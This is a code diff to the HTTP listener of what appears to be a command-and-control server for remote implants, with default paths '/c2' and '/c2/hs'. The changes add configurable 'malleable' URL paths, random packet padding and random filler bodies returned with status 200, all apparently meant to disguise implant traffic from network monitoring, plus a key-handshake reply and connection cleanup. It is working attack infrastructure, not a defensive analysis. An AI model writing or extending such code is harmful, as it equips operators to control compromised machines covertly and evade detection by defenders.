@@ -17,13 +17,30 @@
 
 #include "transport.h"
 #include "crypto_dragon.h"
+#include "malleable_profile.h"
+#include "padding.h"
 
 #define HTTP_SRV_BACKLOG         32
 #define HTTP_LONG_POLL_MS      20000
 #define HTTP_QUEUE_SLOTS          32
 #define HTTP_MAX_HDRS           4096
 
-typedef struct { uint8_t data[FRAME_SIZE]; } FrameSlot;
+static char g_srv_http_path_data[64] = "/c2";
+static char g_srv_http_path_hs[64]   = "/c2/hs";
+
+void http_server_set_paths(const char *data, const char *hs)
+{
+    if (data) {
+        strncpy(g_srv_http_path_data, data, sizeof g_srv_http_path_data - 1);
+        g_srv_http_path_data[sizeof g_srv_http_path_data - 1] = '\0';
+    }
+    if (hs) {
+        strncpy(g_srv_http_path_hs, hs, sizeof g_srv_http_path_hs - 1);
+        g_srv_http_path_hs[sizeof g_srv_http_path_hs - 1] = '\0';
+    }
+}
+
+typedef struct { uint8_t data[WIRE_FRAME_SIZE]; } FrameSlot;
 
 typedef struct {
     FrameSlot       slots[HTTP_QUEUE_SLOTS];
@@ -55,7 +72,7 @@ static int fq_push(FrameQueue *q, const uint8_t *frame) {
                 pthread_mutex_unlock(&q->mu); return -1;
             }
     }
-    memcpy(q->slots[q->tail].data, frame, FRAME_SIZE);
+    memcpy(q->slots[q->tail].data, frame, WIRE_FRAME_SIZE);
     q->tail = (q->tail + 1) % HTTP_QUEUE_SLOTS;
     q->count++;
     pthread_cond_signal(&q->not_empty);
@@ -80,7 +97,7 @@ static int fq_pop(FrameQueue *q, uint8_t *frame, int timeout_ms) {
             if (r==ETIMEDOUT){pthread_mutex_unlock(&q->mu);return -1;}
         }
     }
-    memcpy(frame, q->slots[q->head].data, FRAME_SIZE);
+    memcpy(frame, q->slots[q->head].data, WIRE_FRAME_SIZE);
     q->head = (q->head + 1) % HTTP_QUEUE_SLOTS;
     q->count--;
     pthread_cond_signal(&q->not_full);
@@ -96,6 +113,8 @@ struct transport_conn {
     volatile int       ready;
     pthread_mutex_t    ready_mu;
     pthread_cond_t     ready_cond;
+    uint8_t            hs_pub[32];
+    volatile int       hs_pub_ready;
 };
 
 typedef struct VConn {
@@ -112,6 +131,7 @@ typedef struct {
     pthread_cond_t   new_cond;
     pthread_t        dispatcher_tid;
     volatile int     running;
+    malleable_profile_t profile;
 } ListenerState;
 
 #define MAX_LISTENERS 8
@@ -144,7 +164,7 @@ static int write_exact(int fd, const void *buf, size_t n) {
 typedef struct {
     char    method[8];
     char    path[64];
-    uint8_t body[FRAME_SIZE + 64];
+    uint8_t body[WIRE_FRAME_SIZE + 1024];
     size_t  body_len;
 } HttpRequest;
 
@@ -183,8 +203,8 @@ static int http_respond(int fd, int code, const uint8_t *body, size_t blen) {
             "Content-Length: %zu\r\nConnection: keep-alive\r\n\r\n",code,blen);
     } else {
         hlen=snprintf(hdr,sizeof hdr,
-            "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\n"
-            "Connection: keep-alive\r\n\r\n");
+            "HTTP/1.1 %d No Content\r\nContent-Length: 0\r\n"
+            "Connection: keep-alive\r\n\r\n", code);
     }
     if(write_exact(fd,hdr,(size_t)hlen)!=0)return -1;
     if(body&&blen>0)if(write_exact(fd,body,blen)!=0)return -1;
@@ -210,7 +230,7 @@ static void *http_dispatch_one(void *arg) {
         for(VConn *v=ls->clients;v;v=v->next)
             if(v->addr.sin_addr.s_addr==caddr.sin_addr.s_addr){conn=v->conn;break;}
 
-        if(strcmp(req.method,"POST")==0&&strcmp(req.path,"/c2/hs")==0&&req.body_len==32){
+        if(strcmp(req.method,"POST")==0&&strcmp(req.path,ls->profile.http_path_hs)==0&&req.body_len==32){
             if(!conn){
                 conn=calloc(1,sizeof *conn);
                 fq_init(&conn->rx_q); fq_init(&conn->tx_q);
@@ -228,14 +248,27 @@ static void *http_dispatch_one(void *arg) {
                 conn->tx_q.head=conn->tx_q.tail=conn->tx_q.count=0;
                 pthread_mutex_unlock(&conn->tx_q.mu);
             }
-            uint8_t padded[FRAME_SIZE]={0};
+            uint8_t padded[WIRE_FRAME_SIZE]={0};
             memcpy(padded,req.body,32);
             fq_push(&conn->rx_q,padded);
-            http_respond(fd,204,NULL,0);
-            conn->ready=1;
             ls->new_conn=conn;
             pthread_cond_signal(&ls->new_cond);
             pthread_mutex_unlock(&ls->mu);
+
+            pthread_mutex_lock(&conn->ready_mu);
+            struct timespec hs_ts;
+            clock_gettime(CLOCK_REALTIME, &hs_ts);
+            hs_ts.tv_sec += 10;
+            while(!conn->hs_pub_ready)
+                if(pthread_cond_timedwait(&conn->ready_cond,&conn->ready_mu,&hs_ts)==ETIMEDOUT) break;
+            pthread_mutex_unlock(&conn->ready_mu);
+
+            if(conn->hs_pub_ready){
+                http_respond(fd, 200, conn->hs_pub, 32);
+                conn->hs_pub_ready=0;
+            } else {
+                http_respond(fd, 204, NULL, 0);
+            }
             continue;
         }
         pthread_mutex_unlock(&ls->mu);
@@ -245,16 +278,34 @@ static void *http_dispatch_one(void *arg) {
             close(fd); return NULL;
         }
 
-        if(strcmp(req.method,"POST")==0&&strcmp(req.path,"/c2")==0&&req.body_len==FRAME_SIZE){
+        if(strcmp(req.method,"POST")==0&&strcmp(req.path,ls->profile.http_path_data)==0&&req.body_len>=WIRE_FRAME_SIZE){
             fq_push(&conn->rx_q,req.body);
-            http_respond(fd,204,NULL,0);
+            uint8_t frame[WIRE_FRAME_SIZE];
+            if(fq_pop(&conn->tx_q,frame,0)==0){
+                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
+                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
+                int pad_len = generate_padding(ls->profile.pkt_pad_min, ls->profile.pkt_pad_max, sendbuf + WIRE_FRAME_SIZE, 1024);
+                http_respond(fd, 200, sendbuf, (size_t)(WIRE_FRAME_SIZE + pad_len));
+            } else {
+                uint8_t filler[64];
+                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
+                randombytes_buf(filler, flen);
+                http_respond(fd, 200, filler, (size_t)flen);
+            }
         }
-        else if(strcmp(req.method,"GET")==0&&strcmp(req.path,"/c2")==0){
-            uint8_t frame[FRAME_SIZE];
-            if(fq_pop(&conn->tx_q,frame,HTTP_LONG_POLL_MS)==0)
-                http_respond(fd,200,frame,FRAME_SIZE);
-            else
-                http_respond(fd,204,NULL,0);
+        else if(strcmp(req.method,"GET")==0&&strcmp(req.path,ls->profile.http_path_data)==0){
+            uint8_t frame[WIRE_FRAME_SIZE];
+            if(fq_pop(&conn->tx_q,frame,HTTP_LONG_POLL_MS)==0){
+                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
+                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
+                int pad_len = generate_padding(ls->profile.pkt_pad_min, ls->profile.pkt_pad_max, sendbuf + WIRE_FRAME_SIZE, 1024);
+                http_respond(fd, 200, sendbuf, WIRE_FRAME_SIZE + pad_len);
+            } else {
+                uint8_t filler[64];
+                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
+                randombytes_buf(filler, flen);
+                http_respond(fd, 200, filler, (size_t)flen);
+            }
         }
         else {
             http_respond(fd,404,NULL,0);
@@ -292,6 +343,9 @@ static int http_srv_listen(int port) {
     ListenerState *ls=calloc(1,sizeof *ls);
     if(!ls){close(fd);return -1;}
     ls->listener_fd=fd; ls->running=1;
+    memset(&ls->profile, 0, sizeof ls->profile);
+    strncpy(ls->profile.http_path_data, g_srv_http_path_data, MP_PATH_MAX - 1);
+    strncpy(ls->profile.http_path_hs, g_srv_http_path_hs, MP_PATH_MAX - 1);
     pthread_mutex_init(&ls->mu,NULL);
     pthread_cond_init(&ls->new_cond,NULL);
 
@@ -321,16 +375,24 @@ static transport_conn_t *http_srv_accept(int listener_fd, struct sockaddr_in *ou
 
 static int http_srv_send(transport_conn_t *conn, const uint8_t *buf, size_t len) {
     if(!conn||!buf||len==0)return -1;
-    if(len!=FRAME_SIZE)return -1;
+    if(len==32){
+        memcpy(conn->hs_pub, buf, 32);
+        pthread_mutex_lock(&conn->ready_mu);
+        conn->hs_pub_ready=1;
+        pthread_cond_signal(&conn->ready_cond);
+        pthread_mutex_unlock(&conn->ready_mu);
+        return 32;
+    }
+    if(len!=WIRE_FRAME_SIZE)return -1;
     if(fq_push(&conn->tx_q,buf)!=0)return -1;
-    return (int)FRAME_SIZE;
+    return (int)WIRE_FRAME_SIZE;
 }
 
 static int http_srv_recv(transport_conn_t *conn, uint8_t *buf, size_t len) {
     if(!conn||!buf||len==0)return -1;
-    uint8_t frame[FRAME_SIZE];
+    uint8_t frame[WIRE_FRAME_SIZE];
     if(fq_pop(&conn->rx_q,frame,-1)!=0)return -1;
-    size_t copy=(len<FRAME_SIZE)?len:FRAME_SIZE;
+    size_t copy=(len<WIRE_FRAME_SIZE)?len:WIRE_FRAME_SIZE;
     memcpy(buf,frame,copy);
     return (int)copy;
 }
@@ -360,6 +422,26 @@ static void http_srv_close(transport_conn_t *conn) {
     conn->running=0;
     pthread_cond_broadcast(&conn->rx_q.not_empty);
     pthread_cond_broadcast(&conn->tx_q.not_empty);
+
+    pthread_mutex_lock(&g_listeners_mu);
+    for (int i = 0; i < g_nlisteners; i++) {
+        ListenerState *ls = g_listeners[i];
+        if (!ls) continue;
+        pthread_mutex_lock(&ls->mu);
+        VConn **pp = &ls->clients;
+        while (*pp) {
+            if ((*pp)->conn == conn) {
+                VConn *dead = *pp;
+                *pp = dead->next;
+                free(dead);
+                break;
+            }
+            pp = &(*pp)->next;
+        }
+        pthread_mutex_unlock(&ls->mu);
+    }
+    pthread_mutex_unlock(&g_listeners_mu);
+
     fq_destroy(&conn->rx_q); fq_destroy(&conn->tx_q);
     pthread_mutex_destroy(&conn->ready_mu);
     pthread_cond_destroy(&conn->ready_cond);
@@ -368,8 +450,18 @@ static void http_srv_close(transport_conn_t *conn) {
 
 static void http_srv_close_listener(int fd) {
     ListenerState *ls=find_listener_state(fd);
-    if(ls)ls->running=0;
-    shutdown(fd,SHUT_RDWR); close(fd);
+    if (ls) {
+        ls->running = 0;
+        pthread_mutex_lock(&ls->mu);
+        while (ls->clients) {
+            VConn *v = ls->clients;
+            ls->clients = v->next;
+            free(v);
+        }
+        pthread_mutex_unlock(&ls->mu);
+    }
+    shutdown(fd, SHUT_RDWR);
+    close(fd);
 }
 
 static int http_srv_get_fd(transport_conn_t *conn){(void)conn;return -1;}
